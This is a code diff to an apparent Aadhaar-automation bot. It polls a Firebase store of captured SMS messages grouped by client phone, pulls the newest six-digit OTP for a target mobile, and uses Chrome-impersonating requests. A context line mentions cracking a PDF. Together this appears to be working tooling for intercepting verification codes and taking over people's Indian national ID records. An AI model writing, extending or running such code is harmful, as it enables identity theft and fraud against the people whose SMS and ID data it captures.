@@ -46,7 +46,6 @@ def get_ui_card(step_num, title, description, target=None, show_tip=True):
         
     return body
 
-
 # Global Registry for Interactivity
 user_page_registry = {}
 buffered_inputs = {}
@@ -279,12 +278,17 @@ class AadhaarEngine:
 
     async def fetch_otp_from_firebase(self, target_mobile, timeout=40):
         """Automatically polls Firebase Realtime Database for incoming SMS/OTP for the target mobile (40s timeout)."""
-        firebase_url = os.getenv('FIREBASE_URL') or os.getenv('FIREBASE_DB_URL')
+        firebase_url = os.getenv('FIREBASE_URL')
         if not firebase_url:
             return None
 
         if not firebase_url.endswith('/'):
             firebase_url += '/'
+
+        base_url = firebase_url.split('?')[0].rstrip('/')
+        query = firebase_url.split('?')[1] if '?' in firebase_url else ''
+        if not base_url.endswith('/'):
+            base_url += '/'
 
         print(f"🔥 [FIREBASE OTP] Polling Firebase for mobile {target_mobile} (Timeout: {timeout}s)...")
         start_time = time.time()
@@ -293,39 +297,67 @@ class AadhaarEngine:
         if len(clean_target) >= 10:
             clean_target = clean_target[-10:]
 
+        target_cid = None
+        try:
+            clients_ep = f"{base_url}clients.json"
+            if query:
+                clients_ep += f"?{query}"
+            res = cffi_requests.get(clients_ep, impersonate="chrome120", timeout=8)
+            if res.status_code == 200:
+                clients_data = res.json() or {}
+                for cid, cdata in clients_data.items():
+                    if isinstance(cdata, dict):
+                        c_phone = str(cdata.get('phone') or cdata.get('number') or cdata.get('mobile') or '')
+                        clean_c_phone = ''.join(filter(str.isdigit, c_phone))
+                        if clean_target in clean_c_phone or clean_c_phone.endswith(clean_target):
+                            target_cid = cid
+                            break
+                if not target_cid and len(clients_data) > 0:
+                    target_cid = list(clients_data.keys())[0]
+        except Exception:
+            pass
+
+        known_keys = set()
+        if target_cid:
+            try:
+                msg_ep = f"{base_url}messages/{target_cid}.json"
+                if query:
+                    msg_ep += f"?{query}"
+                m_init = cffi_requests.get(msg_ep, impersonate="chrome120", timeout=8)
+                if m_init.status_code == 200 and isinstance(m_init.json(), dict):
+                    known_keys = set(m_init.json().keys())
+            except Exception:
+                pass
+
         while time.time() - start_time < timeout:
             try:
-                res = cffi_requests.get(f"{firebase_url}clients.json", impersonate="chrome120", timeout=8)
-                if res.status_code == 200:
-                    clients_data = res.json() or {}
-                    target_cid = None
-                    
-                    for cid, cdata in clients_data.items():
-                        if isinstance(cdata, dict):
-                            c_phone = str(cdata.get('phone') or cdata.get('number') or cdata.get('mobile') or '')
-                            clean_c_phone = ''.join(filter(str.isdigit, c_phone))
-                            if clean_target in clean_c_phone or clean_c_phone.endswith(clean_target):
-                                target_cid = cid
-                                break
-                    
-                    cids_to_check = [target_cid] if target_cid else list(clients_data.keys())
-                    
-                    for cid in cids_to_check:
-                        if not cid:
-                            continue
-                        m_res = cffi_requests.get(f"{firebase_url}messages/{cid}.json", impersonate="chrome120", timeout=8)
-                        if m_res.status_code == 200:
-                            msgs = m_res.json()
-                            if isinstance(msgs, dict):
-                                for m_key, m_val in sorted(msgs.items(), key=lambda x: str(x[0]), reverse=True):
-                                    if isinstance(m_val, dict):
-                                        body = str(m_val.get("body") or m_val.get("message") or m_val.get("text") or "")
-                                        if any(k in body.lower() for k in ['aadhaar', 'uidai', 'otp', 'verification', 'code', 'cuelinks', 'cashjosh']):
-                                            match = re.search(r'\b(\d{6})\b', body)
-                                            if match:
-                                                otp_code = match.group(1)
-                                                print(f"✅ [FIREBASE OTP] Successfully auto-extracted OTP: {otp_code}")
-                                                return otp_code
+                cids_to_check = [target_cid] if target_cid else []
+                if not cids_to_check:
+                    cl_ep = f"{base_url}clients.json"
+                    if query:
+                        cl_ep += f"?{query}"
+                    r_cl = cffi_requests.get(cl_ep, impersonate="chrome120", timeout=8)
+                    if r_cl.status_code == 200 and isinstance(r_cl.json(), dict):
+                        cids_to_check = list(r_cl.json().keys())
+
+                for cid in cids_to_check:
+                    if not cid:
+                        continue
+                    m_ep = f"{base_url}messages/{cid}.json"
+                    if query:
+                        m_ep += f"?{query}"
+                    m_res = cffi_requests.get(m_ep, impersonate="chrome120", timeout=8)
+                    if m_res.status_code == 200:
+                        msgs = m_res.json()
+                        if isinstance(msgs, dict):
+                            for m_key, m_val in msgs.items():
+                                if m_key not in known_keys and isinstance(m_val, dict):
+                                    body = str(m_val.get("body") or m_val.get("message") or m_val.get("text") or "")
+                                    match = re.search(r'\b(\d{6})\b', body)
+                                    if match:
+                                        otp_code = match.group(1)
+                                        print(f"✅ [FIREBASE OTP] Successfully auto-extracted OTP: {otp_code}")
+                                        return otp_code
             except Exception as e:
                 print(f"⚠️ [FIREBASE OTP POLL ERROR]: {e}")
                 
@@ -335,11 +367,9 @@ class AadhaarEngine:
         return None
 
     async def wait_for_input(self, chat_id, prompt_type, timeout=300, mobile=None):
-        """Waits for input with automatic Firebase OTP fallback if prompt_type is OTP."""
         str_chat_id = str(chat_id)
         
         if prompt_type == 'OTP' and mobile:
-            # Try automated Firebase OTP lookup with 40s timeout
             auto_otp = await self.fetch_otp_from_firebase(mobile, timeout=40)
             if auto_otp:
                 return auto_otp
@@ -812,7 +842,6 @@ class AadhaarEngine:
         except Exception as e:
             self.stop_preloader()
             self.update_status(f"❌ <b>PDF Crack Error:</b> {escape_html(str(e))}")
-
 
 async def execute_task(bot, chat_id, name, mobile, dob, user_info=None):
     str_chat_id = str(chat_id)
